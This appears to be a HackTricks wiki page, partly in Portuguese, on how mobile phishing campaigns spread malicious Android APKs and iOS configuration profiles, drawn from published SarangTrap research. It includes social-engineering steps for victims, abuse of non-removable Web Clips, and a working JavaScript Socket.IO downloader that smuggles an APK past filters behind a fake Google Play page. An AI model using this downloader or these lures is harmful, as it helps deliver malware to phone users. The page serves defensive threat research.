# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cobre técnicas usadas por threat actors para distribuir **malicious Android APKs** e **iOS mobile-configuration profiles** por meio de phishing (SEO, social engineering, fake stores, dating apps, etc.).
> O material é adaptado da campanha SarangTrap exposta pela Zimperium zLabs (2025) e de outras pesquisas públicas.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrar dezenas de domínios parecidos (dating, cloud share, car service…).
– Usar palavras-chave no idioma local e emojis no elemento `<title>` para ranquear no Google.
– Hospedar *both* Android (`.apk`) e instruções de instalação do iOS na mesma landing page.
2. **First Stage Download**
* Android: link direto para um APK *unsigned* ou de “third-party store”.
* iOS: `itms-services://` ou link HTTPS comum para um perfil malicioso **mobileconfig** (veja abaixo).
3. **Android Post-install Behaviour**
* Execução protegida por C2, abuso de permissões, dropper bypasses, coleta em background e outros comportamentos de malware pós-instalação são cobertos na página dedicada de Android Malware Post-Exploitation abaixo.
4. **iOS Delivery Technique**
* Um único **mobile-configuration profile** pode solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. para inscrever o dispositivo em supervisão semelhante a “MDM”.
* Instruções de social-engineering:
1. Abra Settings ➜ *Profile downloaded*.
2. Toque em *Install* três vezes (screenshots na página de phishing).
3. Confie no perfil unsigned ➜ o attacker obtém permissão para *Contacts* e *Photo* sem revisão da App Store.
5. **iOS Web Clip Payload (phishing app icon)**
* Payloads `com.apple.webClip.managed` podem **fixar uma phishing URL na Home Screen** com um ícone/rótulo de marca.
* Web Clips podem rodar em **full-screen** (esconde a UI do browser) e ser marcados como **non-removable**, forçando a vítima a deletar o profile para remover o ícone.
6. **Network Layer**
* Plain HTTP, geralmente na porta 80 com header HOST como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sem TLS → fácil de detectar).

## Android Malware Post-Exploitation

Para tradecraft de malware Android pós-instalação, como C2, abuso de Accessibility, overlays, automação ATS, staged DEX loading, premium SMS e persistence, veja:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

Typical client flow observed in the wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Por que ele contorna controles simples:
- Nenhum URL estático de APK é exposto; o payload é reconstruído na memória a partir de frames WebSocket.
- Filtros de URL/MIME/extensão que bloqueiam respostas diretas .apk podem não detectar dados binários encapsulados via WebSockets/Socket.IO.
- Crawlers e sandboxes de URL que não executam WebSockets não recuperarão o payload.

Veja também tradecraft e tooling de WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References


- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Socket.IO](https://socket.io)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
